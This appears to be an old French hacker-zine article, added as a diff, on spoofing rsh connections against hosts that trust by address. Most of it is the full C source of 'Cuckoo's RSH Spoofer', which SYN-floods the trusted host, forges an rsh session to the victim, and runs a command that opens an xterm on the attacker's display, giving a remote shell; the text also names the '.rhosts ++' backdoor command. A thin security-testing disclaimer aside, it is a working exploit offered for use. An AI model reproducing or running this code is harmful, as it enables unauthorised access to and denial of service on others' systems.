@@ -1,0 +1,286 @@
+                     Rsh spoofing, what? By Lionel
+                     =============================
+
+
+
+
+1)Intro
+-------
+
+Ce texte a été ecrit pour verifier la securité de son serveur et non a des fin
+illegale.
+
+2)Expliquation
+---------------
+
+Cette technique utilisé par les "hackers" pour spoofer (prendre une fausse
+identité) l'adresse de la victime pour pouvoir rentrer par rsh qui controle
+les entrées par l'host dans certain cas.Mauvaise configuration...
+Perso j'ai jamais testé la technique mais on ma dit que c'etais vraiment bien.
+Tout depend de la config ... 
+/*
+J'ai dernierment etudié la question et ce que produit les progs est simple,
+il s'agit de lancé sur une victim rsh -l root host cmd avec une fausse host de
+src pour passé la secu qui donne une autorisation en fonction de l'host.
+Donc les data des progs sont:
+SYN -> demande connection
+DATA -> envoie DATA {
+local_user\0
+remote_user\0
+commande\0 (commande qui est echo"++" >> ~/.rhosts dans la plupart du temps)
+}
+FIN -> envoie fin de connection
+*/
+Bon pour utilisé ce probleme suffit la plupart du temps de spoofer une
+host du style:
+exemple tu veus rentrer dans localhost.fr
+syntaxe: ./prg host userlocal userremote
+./prg hack.localhost.fr root root 
+J'espere que vous comprenez ce que j'essaye de vous expliquez...
+Bon pour trouver une host dans ce style on fait un chtit:
+host -l -v -t any localhost.com
+Enfin voila quoi...
+Peut etre que j'ai dit des conneries car je connais tres mal cette technique.
+
+3)code
+------
+code by ankou:
+
+___________________________________________________________________________
+/*
+ *	Cuckoo's RSH Spoofer for Linux <= 2.0.35 ( with TCP Blind bug )
+ *	by ankou <ank0u@usa.net> of The Cuckoo's Crew
+ *	Ripped code : spoof.c ( of Jochen Thomas Bauer <jtb@THEO2.PHYSIK.UNI-STUTTGART.DE> )
+ *
+*/
+
+#include <stdio.h>
+#include <netinet/ip.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/tcp.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <asm/types.h>
+
+#define FIN 1
+#define SYN 2
+#define SEQ 20985
+#define DELAY 1000
+#define NUMBASYN 20
+
+/*---------------Checksum calculation--------------------------------*/
+unsigned short in_cksum(unsigned short *addr,int len)
+{
+ register int nleft = len;
+ register unsigned short *w = addr;
+ register int sum = 0;
+ unsigned short answer = 0;
+ while (nleft > 1)
+        {
+        sum += *w++;
+        nleft -= 2;
+        }
+ if (nleft == 1)
+        {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+        }
+ sum = (sum >> 16) + (sum & 0xffff);
+ sum += (sum >> 16);
+ answer = ~sum;
+ return(answer);
+}
+/*----------------------------------------------------------------------*/
+/*------------Send spoofed TCP packet-----------------------------------*/
+int send_tcp(int sfd,unsigned int src,unsigned short src_p,
+             unsigned int dst,unsigned short dst_p,tcp_seq seq,tcp_seq ack,
+             u_char flags,char *buffer,int len)
+{
+ struct iphdr ip_head;
+ struct tcphdr tcp_head;
+ struct sockaddr_in target;
+ char packet[2048];     /*the exploitation of this is left as an exercise..*/
+ int i;
+ struct tcp_pseudo        /*the tcp pseudo header*/
+ {
+  __u32 src_addr;
+  __u32 dst_addr;
+  __u8  dummy;
+  __u8  proto;
+  __u16 length;
+ } pseudohead;
+ struct help_checksum   /*struct for checksum calculation*/
+ {
+  struct tcp_pseudo pshd;
+  struct tcphdr tcphd;
+  char tcpdata[1024];
+ } tcp_chk_construct;
+ /*Prepare IP header*/
+ ip_head.ihl      = 5;     /*headerlength with no options*/
+ ip_head.version  = 4;
+ ip_head.tos      = 0;
+ ip_head.tot_len  = htons(sizeof(struct iphdr)+sizeof(struct tcphdr)+len);
+ ip_head.id       = htons(31337 + (rand()%100));
+ ip_head.frag_off = 0;
+ ip_head.ttl      = 255;
+ ip_head.protocol = IPPROTO_TCP;
+ ip_head.check    = 0;    /*Fill in later*/
+ ip_head.saddr    = src;
+ ip_head.daddr    = dst;
+ ip_head.check    = in_cksum((unsigned short *)&ip_head,sizeof(struct iphdr));
+ /*Prepare TCP header*/
+ tcp_head.th_sport = htons(src_p);
+ tcp_head.th_dport = htons(dst_p);
+ tcp_head.th_seq   = htonl(seq);
+ tcp_head.th_ack   = htonl(ack);
+ tcp_head.th_x2    = 0;
+ tcp_head.th_off   = 5;
+ tcp_head.th_flags = flags;
+ tcp_head.th_win   = htons(0x7c00);
+ tcp_head.th_sum   = 0;  /*Fill in later*/
+ tcp_head.th_urp   = 0;
+ /*Assemble structure for checksum calculation and calculate checksum*/
+ pseudohead.src_addr=ip_head.saddr;
+ pseudohead.dst_addr=ip_head.daddr;
+ pseudohead.dummy=0;
+ pseudohead.proto=ip_head.protocol;
+ pseudohead.length=htons(sizeof(struct tcphdr)+len);
+ tcp_chk_construct.pshd=pseudohead;
+ tcp_chk_construct.tcphd=tcp_head;
+ memcpy(tcp_chk_construct.tcpdata,buffer,len);
+ tcp_head.th_sum=in_cksum((unsigned short *)&tcp_chk_construct,
+                         sizeof(struct tcp_pseudo)+sizeof(struct tcphdr)+len);
+ /*Assemble packet*/
+ memcpy(packet,(char *)&ip_head,sizeof(ip_head));
+ memcpy(packet+sizeof(ip_head),(char *)&tcp_head,sizeof(tcp_head));
+ memcpy(packet+sizeof(ip_head)+sizeof(tcp_head),buffer,len);
+ /*Send packet*/
+ target.sin_family     = AF_INET;
+ target.sin_addr.s_addr= ip_head.daddr;
+ target.sin_port       = tcp_head.th_dport;
+ i=sendto(sfd,packet,sizeof(struct iphdr)+sizeof(struct tcphdr)+len,0,
+                    (struct sockaddr *)&target,sizeof(struct sockaddr_in));
+ if(i<0)
+   return(-1); /*Error*/
+ else
+   return(i); /*Return number of bytes sent*/
+}
+/*---------------------------------------------------------------------*/
+main(int argc, char *argv[])
+{
+ int i;
+ unsigned int source,target;
+ unsigned short int s_port,d_port;
+
+ char data[512];
+ char tmp[512];
+ char *cmdptr;
+ int j, lendata;
+
+ printf("Cuckoo's RSH Spoofer - ankou <ank0u@usa.net> of The Cuckoo's Crew\n\n");
+
+ if ( argc != 8 )
+  {
+   printf("Usage : %s <spoofed Source_IP> <Source_Port> <victim Dest_IP> <Dest_Port> <My_IP> <Local_User> <Remote_User>\n", argv[0]);
+   printf("Warning: dont forget to type xhost + in your xterm before use this proggy.\n");
+   exit(1);
+  }
+
+ source=inet_addr(argv[1]);
+ s_port=atoi(argv[2]);
+ target=inet_addr(argv[3]);
+ d_port=atoi(argv[4]);
+
+ printf("Making buffer...");
+ memset(data, 0, 512);
+ memset(tmp, 0, 512);
+ sprintf(tmp, "/usr/X11R6/bin/xterm -ut -bg black -fg white -display %s:0", argv[5]);
+
+/*
+ * [port]\0
+ * luser\0
+ * ruser\0
+ * command\0
+ *
+ */
+
+ lendata = 0;
+ cmdptr=data;
+ strcat(cmdptr,"0\0");
+ lendata += 2;
+ cmdptr=cmdptr+2;
+ strcat(cmdptr,argv[6]);
+ lendata += strlen(argv[6])+1;
+ cmdptr=cmdptr+strlen(argv[6])+1;
+ strcat(cmdptr,argv[7]);
+ lendata += strlen(argv[7])+1;
+ cmdptr=cmdptr+strlen(argv[7])+1;
+ strcat(cmdptr,tmp);
+ lendata += strlen(tmp)+1;
+ cmdptr=cmdptr+strlen(tmp)+1;
+ lendata = sizeof(data);
+
+ printf("ok\n");
+
+
+ if((i=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0)  /*open sending socket*/
+  {
+   perror("socket");
+   exit(1);
+  }
+
+ printf("Let's play SYN flooding to %s on port %d !\n", argv[1], s_port);
+ for(j=0;j<NUMBASYN;j++)
+ {
+	send_tcp(i,source,s_port,source,s_port,SEQ,0,SYN,NULL,0);
+ }
+
+ printf("Let's spoof happy to %s on port %d :)\n", argv[3], d_port);
+ send_tcp(i,source,s_port,target,d_port,SEQ,0,SYN,NULL,0);
+ printf("SYN sent\n");
+
+ usleep(DELAY);
+ send_tcp(i,source,s_port,target,d_port,SEQ+1,0,0,data,lendata); /*no flags set*/
+ printf("data sent\n");
+
+ usleep(DELAY);
+ send_tcp(i,source,s_port,target,d_port,SEQ+lendata+1,0,FIN,NULL,0);
+ printf("FIN sent\n");
+
+ close(i);
+
+ printf("Wait xterm now ! :)\nBye\n");
+}
+___________________________________________________________________________
+
+
+code by Lionel:
+___________________________________________________________________________
+voir organiks2/mag/prog/rshspoof.tar.gz(j'ai pas testé le code ,il est peut
+etre defectueux...,sorry)
+___________________________________________________________________________
+
+Y en a d'autres...
+Code le toi meme c'est le mieux!
+P.S.: ADMrsh mais je suis pas pour ADM car dite vous qui vous prenne pour de
+la merde, pour eux vous etes tous des minable et eux des rois!!Ils se croivent
+encore au moyen age ;) desolé pour les membres de ADM que je respecte, bref pas
+beaucoups :)
+
+4)Conclusion
+------------
+
+Ben testé bien vos chtit secu , et n'oublié pas No hack than FUN and profit :p
+
+5)Greetz
+--------
+To: clemm, spoty , ank , tiffa, shado, klog, XSFX, Datahck, OrganiKs,[fred],
+Mayhem, rix, exile , chx , prfalken , togusa , einstein , #toulouse, #r9,
+#rhino9,madchat(#madchat->undernet),Darkbug,#linux-fr(ircnet),#oracle(efnet),
+torcy&marcx dormoy&18eme (Ali k.,Xav,Olivier,Mathieux,Mémet,Arnauld,Camel,...),
+cantepeau(sophie,ced,youness,seb,la shente,bouboule,ouadgerie, ...),
+ toulouse(Gui.,florian,Lionel,JM,Dav,Vincent,Bruno,yohan,seb,cyril,
+damien,jenny&virginie,stef&julie...).......Et tous ce que j'oublie...
+
